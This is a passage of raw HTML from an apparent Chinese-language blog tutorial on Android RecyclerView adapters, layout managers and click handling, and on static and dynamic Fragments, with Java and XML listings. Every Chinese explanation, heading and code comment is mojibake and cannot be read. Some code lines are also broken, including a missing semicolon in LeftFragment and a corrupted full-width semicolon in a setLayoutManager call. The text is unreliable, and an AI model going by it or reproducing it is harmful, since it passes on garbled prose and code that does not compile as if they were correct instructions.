class="string">&quot;match_parent&quot;</span></span><br><span class="line">     android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>Fruitå’Œfruit_item.xmlåŒä¸Š</p><p>FruitAdapterä¿®æ”¹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.recyclerview;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FruitAdapter</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.Adapter&lt;FruitAdapter.ViewHolder&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; mFruitList;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FruitAdapter</span><span class="params">(List&lt;Fruit&gt; fruitList)</span>&#123;</span><br><span class="line">        mFruitList=fruitList; <span class="comment">//ä¼ é€’æ•°æ®æº</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>  <span class="keyword">class</span> <span class="title class_">ViewHolder</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.ViewHolder&#123;</span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ViewHolder</span><span class="params">(View itemView)</span> &#123;  <span class="comment">//itemView å­é¡¹æœ€å¤–å±‚å¸ƒå±€</span></span><br><span class="line">            <span class="built_in">super</span>(itemView);</span><br><span class="line">            fruitImage=itemView.findViewById(R.id.fruit_image);</span><br><span class="line">            fruitName=itemView.findViewById((R.id.fruit_name));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FruitAdapter.ViewHolder <span class="title function_">onCreateViewHolder</span><span class="params">(ViewGroup parent, <span class="type">int</span> viewType)</span> &#123;</span><br><span class="line">        View view= LayoutInflater.from(parent.getContext()).inflate(R.layout.fruit_item,parent,<span class="literal">false</span>);</span><br><span class="line">        ViewHolder holder=<span class="keyword">new</span> <span class="title class_">ViewHolder</span>((view));</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onBindViewHolder</span><span class="params">(FruitAdapter.ViewHolder holder, <span class="type">int</span> position)</span> &#123;</span><br><span class="line">        <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> mFruitList.get(position);</span><br><span class="line">        holder.fruitImage.setImageResource(fruit.getImageId());</span><br><span class="line">        holder.fruitName.setText(fruit.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getItemCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> mFruitList.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>onCreateViewHolder()ï¼šåˆ›å»ºViewHolderå®ä¾‹ï¼ŒæŠŠåŠ è½½å‡ºæ¥çš„å¸ƒå±€ä¼ å…¥åˆ°æ„é€ å‡½æ•°ä¸­ï¼Œæœ€åå°†ViewHolderå®ä¾‹è¿”å›</p><p>onBindViewHolder()ï¼šå¯¹RecyclerViewå­é¡¹çš„æ•°æ®è¿›è¡Œèµ‹å€¼ï¼Œä¼šåœ¨æ¯ä¸ªå­é¡¹æ»šåˆ°å±å¹•å†…æ‰§è¡Œï¼Œé€šè¿‡positionè·å¾—Fruitå®ä¾‹ï¼Œå†è®¾ç½®æ•°æ®ã€‚</p><p>getItemCount()ï¼šæ•°æ®æºé•¿åº¦</p><p>MainActivityå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.recyclerview;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList =<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits();<span class="comment">//åˆå§‹åŒ–æ•°æ®</span></span><br><span class="line">        <span class="type">RecyclerView</span> <span class="variable">recyclerView</span> <span class="operator">=</span> findViewById(R.id.recycler_view);</span><br><span class="line">        <span class="type">LinearLayoutManager</span> <span class="variable">layoutManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinearLayoutManager</span>(<span class="built_in">this</span>);</span><br><span class="line">        recyclerView.setLayoutManager(layoutManager);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(fruitList);</span><br><span class="line">        recyclerView.setAdapter(adapter);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initFruits</span><span class="params">()</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>layoutManagerï¼šæŒ‡å®šRecyclerViewå¸ƒå±€æ–¹å¼ï¼Œè¿™é‡Œä½¿ç”¨LinearLayoutManageræ˜¯çº¿æ€§å¸ƒå±€çš„æ„æ€</p><h4 id="å®ç°æ¨ªå‘æ»šåŠ¨å’Œç€‘å¸ƒæµå¸ƒå±€">å®ç°æ¨ªå‘æ»šåŠ¨å’Œç€‘å¸ƒæµå¸ƒå±€</h4><p><strong>æ¨ªçº¿æ»šåŠ¨</strong></p><p>ä¿®æ”¹fruit_item</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;100dp&quot;</span>  //<span class="attr">ä¸ºäº†é¿å…åå­—é•¿çŸ­ä¸ä¸€</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_image&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;10dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Fruit&gt; fruitList =<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits();</span><br><span class="line">        <span class="type">RecyclerView</span> <span class="variable">recyclerView</span> <span class="operator">=</span> findViewById(R.id.recycler_view);</span><br><span class="line">        <span class="type">LinearLayoutManager</span> <span class="variable">layoutManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinearLayoutManager</span>(<span class="built_in">this</span>);</span><br><span class="line">        </span><br><span class="line">        layoutManager.setOrientation(LinearLayoutManager.HORIZONTAL);</span><br><span class="line">        </span><br><span class="line">        recyclerView.setLayoutManager(layoutManager)ï¼›</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(fruitList);</span><br><span class="line">        recyclerView.setAdapter(adapter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ä¸Šé¢RecyclerViewåŸºæœ¬ä½¿ç”¨ç›¸æ¯”ï¼Œå¤šäº†<code>layoutManager.setOrientation(LinearLayoutManager.HORIZONTAL);</code></p><p>è¿™ä¸ªæ–¹æ³•ç”¨æ¥è®¾ç½®å¸ƒå±€æ’åˆ—æ–¹å‘ï¼Œé»˜è®¤æ˜¯çºµå‘çš„ï¼Œä¼ å…¥LinearLayoutManager.HORIZONTALè¡¨ç¤ºå¸ƒå±€æ¨ªå‘æ’åˆ—ï¼Œå°±å¯ä»¥æ¨ªå‘æ»šåŠ¨äº†ã€‚</p><p>é™¤äº†LinearLayoutManagerï¼ŒRecyclerViewè¿˜æä¾›<code>GridLayoutManager</code>å’Œ<code>StaggeredGridLayoutManager</code></p><p>GridLayoutManagerï¼šå®ç°ç½‘ç»œå¸ƒå±€</p><p>StaggeredGridLayoutManagerï¼šå®ç°ç€‘å¸ƒæµå¸ƒå±€</p><p><strong>å¯¹äºç€‘å¸ƒæµå®ç°åšå¦‚ä¸‹ä¿®æ”¹</strong></p><p><strong>fruit_item.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span>   //<span class="attr">ç€‘å¸ƒå¸ƒå±€å®½åº¦ç”±åˆ—æ•°å†³å®š</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_margin</span>=<span class="string">&quot;5dp&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_image&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/fruit_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;left&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;10dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>MainActivity</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åœ¨ä¸Šé¢ä¾‹å­ä¸­åšå¦‚ä¸‹ä¿®æ”¹</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        initFruits();</span><br><span class="line">        <span class="type">RecyclerView</span> <span class="variable">recyclerView</span> <span class="operator">=</span> findViewById(R.id.recycler_view);</span><br><span class="line">    </span><br><span class="line">        <span class="type">StaggeredGridLayoutManager</span> <span class="variable">layoutManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StaggeredGridLayoutManager</span>(<span class="number">3</span>, StaggeredGridLayoutManager.VERTICAL);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        recyclerView.setLayoutManager(layoutManager);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">FruitAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FruitAdapter</span>(fruitList);</span><br><span class="line">        recyclerView.setAdapter(adapter);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//StaggeredGridLayoutManager </span></span><br><span class="line"><span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºåˆ—æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ’åˆ—æ–¹å‘</span></span><br></pre></td></tr></table></figure><h4 id="RecyclerViewç‚¹å‡»äº‹ä»¶">RecyclerViewç‚¹å‡»äº‹ä»¶</h4><p>RecyclerViewæ²¡æœ‰æä¾›ç±»ä¼¼ListViewçš„ç‚¹å‡»äº‹ä»¶æ¥å£ï¼ŒListViewç‚¹å‡»äº‹ä»¶æ˜¯é’ˆå¯¹å­é¡¹çš„ï¼Œå¯¹äºå­é¡¹çš„ä¸€ä¸ªæ§ä»¶çš„ç‚¹å‡»äº‹ä»¶éœ€è¦å¦å¤–å®ç°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¯¹åŸºæœ¬çš„RecyclerViewæ“ä½œçš„FruitAdapterè¿›è¡Œå¦‚ä¸‹æ·»åŠ </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span>  <span class="keyword">class</span> <span class="title class_">ViewHolder</span> <span class="keyword">extends</span> <span class="title class_">RecyclerView</span>.ViewHolder&#123;</span><br><span class="line">        View fruitView;</span><br><span class="line">        ImageView fruitImage;</span><br><span class="line">        TextView fruitName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ViewHolder</span><span class="params">(View itemView)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(itemView);</span><br><span class="line">            fruitView=itemView;</span><br><span class="line">            fruitImage=itemView.findViewById(R.id.fruit_image);</span><br><span class="line">            fruitName=itemView.findViewById((R.id.fruit_name));</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> FruitAdapter.ViewHolder <span class="title function_">onCreateViewHolder</span><span class="params">(ViewGroup parent, <span class="type">int</span> viewType)</span> &#123;</span><br><span class="line">        View view= LayoutInflater.from(parent.getContext()).inflate(R.layout.fruit_item,parent,<span class="literal">false</span>);</span><br><span class="line">        ViewHolder holder=<span class="keyword">new</span> <span class="title class_">ViewHolder</span>((view));</span><br><span class="line">        holder.fruitView.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> holder.getAdapterPosition();</span><br><span class="line">                <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> mFruitList.get(position);</span><br><span class="line">                Toast.makeText(view.getContext(), <span class="string">&quot;You click view&quot;</span>+fruit.getName(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        holder.fruitImage.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> holder.getAdapterPosition();</span><br><span class="line">                <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> mFruitList.get(position);</span><br><span class="line">                Toast.makeText(view.getContext(), <span class="string">&quot;You click image&quot;</span>+fruit.getImageId(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="ç¢ç‰‡-Fragment">ç¢ç‰‡(Fragment)</h3><p>ç¢ç‰‡ï¼šä¸€ç§å¯ä»¥åµŒå…¥åœ¨æ´»åŠ¨å½“ä¸­çš„UIç‰‡æ®µï¼Œèƒ½è®©ç¨‹åºæ›´åŠ åˆç†å……åˆ†çš„åˆ©ç”¨å¤§å±å¹•ç©ºé—´ã€‚å¯ä»¥ç±»æ¯”ä¸ºä¸€ä¸ªè¿·ä½ å‹çš„æ´»åŠ¨ï¼Œè™½ç„¶å¯èƒ½å’Œæ´»åŠ¨ä¸€æ ·å¤§</p><h4 id="ç¢ç‰‡åŸºæœ¬ä½¿ç”¨"><strong>ç¢ç‰‡åŸºæœ¬ä½¿ç”¨</strong></h4><p>left_fragment.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Button</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;Button&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>right_fragment.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;TextView</span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">        android:<span class="attribute">textSize</span>=<span class="string">&quot;20sp&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;This is right fragment&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>LeftFragmentç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LeftFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(<span class="meta">@NonNull</span> LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        View view=inflater.inflate(R.layout.left_fragment,container,<span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RightFragmentåŒç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RightFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(<span class="meta">@NonNull</span> LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        View view=inflater.inflate(R.layout.right_fragment,container,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹activiti_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/right_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.RightFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h4 id="åŠ¨æ€åŠ è½½ç¢ç‰‡">åŠ¨æ€åŠ è½½ç¢ç‰‡</h4><p>æ–°å»ºä¸€ä¸ªanother_activiti_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;TextView</span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">        android:<span class="attribute">textSize</span>=<span class="string">&quot;20sp&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;This is another right fragment&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ªç±»AnotherRightFragment</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnotherRightFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span 